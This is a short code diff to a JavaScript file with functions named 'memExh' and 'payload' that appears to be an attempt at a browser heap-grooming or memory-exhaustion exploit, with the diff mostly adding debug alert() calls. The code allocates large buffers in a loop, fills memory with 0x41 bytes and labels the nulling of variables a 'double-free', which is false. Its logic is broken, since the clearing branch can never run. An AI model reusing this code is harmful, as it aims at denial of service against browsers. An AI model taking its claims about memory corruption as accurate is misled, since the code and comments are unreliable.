@@ -43,13 +43,13 @@ function memExh() {
     let se_b = new Uint8Array(b);
     let c = new ArrayBuffer(32);
     let se_c = new Uint8Array(c);
-
+alert("test i")
     let bufferArray = [];
     for (let i = 0; i < 2048; i++) { // Reduced iterations
         bufferArray.push(new ArrayBuffer(900000)); // Allocate smaller buffers
         if (bufferArray.length > 16312) { // Less aggressive clearing
             bufferArray = []; // Clear buffer array to exhaust memory
-
+alert("a")
             // Double-free memory
             let a = null;
             let b = null;
@@ -58,6 +58,7 @@ function memExh() {
             for (let j = 0; j < se_a.length; j++) {
                 se_a[j] = 0x41; // Fill with 'A'
             }
+            alert("Memory buffer after grooming " + i + ": " + se_c[i]);
         }
     }
 }
@@ -77,7 +78,7 @@ function payload() {
             //memExh();
         }
 memExh();
-        alert("Memory buffer after grooming " + i + ": " + se_c[i]);
+        
         // Nested arrays
         nestedArray.push([]);
         if (nestedArray.length > 500) { // Reduced nesting
